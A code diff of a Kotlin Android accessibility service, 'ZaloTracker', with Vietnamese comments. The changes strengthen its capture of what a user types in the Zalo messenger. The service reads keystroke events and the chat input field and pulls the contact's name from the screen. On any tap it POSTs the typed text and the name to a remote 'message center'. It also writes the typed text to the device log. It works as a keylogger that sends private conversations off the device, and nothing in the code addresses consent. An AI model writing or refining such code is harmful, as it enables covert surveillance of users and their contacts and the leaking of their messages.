@@ -22,56 +22,85 @@ class ZaloAccessibilityService : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val pkg = event.packageName?.toString() ?: ""
+        
+        // Log để kiểm tra tên gói Zalo thật sự trên máy bạn
+        // Log.e("ZaloTracker", "Sự kiện từ: $pkg")
+
         if (!pkg.contains("zalo")) return
 
         try {
             when (event.eventType) {
-                // Theo dõi thay đổi văn bản
-                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED, 
-                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                    val rootNode = rootInActiveWindow ?: return
-                    val inputText = findInputText(rootNode)
-                    if (inputText.isNotBlank()) {
-                        lastCapturedText = inputText
-                        // Log.d("ZaloTracker", "Captured: $lastCapturedText")
+                // Theo dõi gõ phím liên tục
+                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                    val text = event.text.joinToString("")
+                    if (text.isNotBlank() && text != "[]") {
+                        lastCapturedText = text
+                        Log.e("ZaloTracker", "✍️ Đang gõ: $lastCapturedText")
                     }
                 }
 
-                // Khi bạn nhấn Gửi
+                // Khi màn hình thay đổi (Zalo chuẩn bị gửi hoặc cập nhật UI)
+                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                    val rootNode = rootInActiveWindow ?: return
+                    val currentText = findInputText(rootNode)
+                    if (currentText.isNotBlank()) {
+                        lastCapturedText = currentText
+                    }
+                }
+
+                // Khi phát hiện bấm nút (Bất kỳ nút nào)
                 AccessibilityEvent.TYPE_VIEW_CLICKED -> {
-                    Log.d("ZaloTracker", "Phát hiện CLICK trên Zalo")
                     if (lastCapturedText.isNotBlank()) {
+                        Log.e("ZaloTracker", "🚀 PHÁT HIỆN GỬI: $lastCapturedText")
                         val rootNode = rootInActiveWindow
                         val name = if (rootNode != null) findContactName(rootNode) else "Người dùng Zalo"
                         
-                        Log.e("ZaloTracker", "🚀 Gửi tin đi: $lastCapturedText")
                         sendToMessageCenter(name, lastCapturedText)
-                        lastCapturedText = "" 
+                        
+                        // Không xóa ngay lập tức để tránh mất dữ liệu nếu nhấn nhiều lần
+                        val textToSend = lastCapturedText
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            if (lastCapturedText == textToSend) lastCapturedText = ""
+                        }, 500)
                     }
                 }
             }
         } catch (e: Exception) {
-            // Log.e("ZaloTracker", "Error: ${e.message}")
+            Log.e("ZaloTracker", "⚠️ Lỗi: ${e.message}")
         }
     }
 
     private fun findInputText(rootNode: AccessibilityNodeInfo): String {
-        val ids = arrayOf("com.zing.zalo:id/chat_input_field", "com.vng.zalo:id/chat_input_field")
+        val ids = arrayOf(
+            "com.zing.zalo:id/chat_input_field", 
+            "com.vng.zalo:id/chat_input_field", 
+            "com.zing.zalo:id/input_field",
+            "com.zing.zalo:id/tv_chat_input"
+        )
         for (id in ids) {
             val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
             if (nodes != null && nodes.isNotEmpty()) {
-                return nodes[0].text?.toString() ?: ""
+                val text = nodes[0].text?.toString() ?: ""
+                nodes.forEach { it.recycle() }
+                if (text.isNotBlank()) return text
             }
         }
         return ""
     }
 
     private fun findContactName(rootNode: AccessibilityNodeInfo): String {
-        val ids = arrayOf("com.zing.zalo:id/chat_title_name", "com.vng.zalo:id/chat_title_name")
+        val ids = arrayOf(
+            "com.zing.zalo:id/chat_title_name", 
+            "com.vng.zalo:id/chat_title_name", 
+            "com.zing.zalo:id/tv_header_title",
+            "com.zing.zalo:id/name"
+        )
         for (id in ids) {
             val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
             if (nodes != null && nodes.isNotEmpty()) {
-                return nodes[0].text?.toString() ?: ""
+                val name = nodes[0].text?.toString() ?: ""
+                nodes.forEach { it.recycle() }
+                if (name.isNotBlank()) return name
             }
         }
         return "Người dùng Zalo"
@@ -88,10 +117,10 @@ class ZaloAccessibilityService : AccessibilityService() {
         val request = Request.Builder().url(url).post(body).build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
-                Log.e("ZaloTracker", "❌ Gửi thất bại: ${e.message}")
+                Log.e("ZaloTracker", "❌ GỬI THẤT BẠI: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
-                Log.e("ZaloTracker", "✅ ĐÃ GỬI THÀNH CÔNG OUTBOUND!")
+                Log.e("ZaloTracker", "✅ ĐÃ GỬI OUTBOUND THÀNH CÔNG!")
                 response.close()
             }
         })
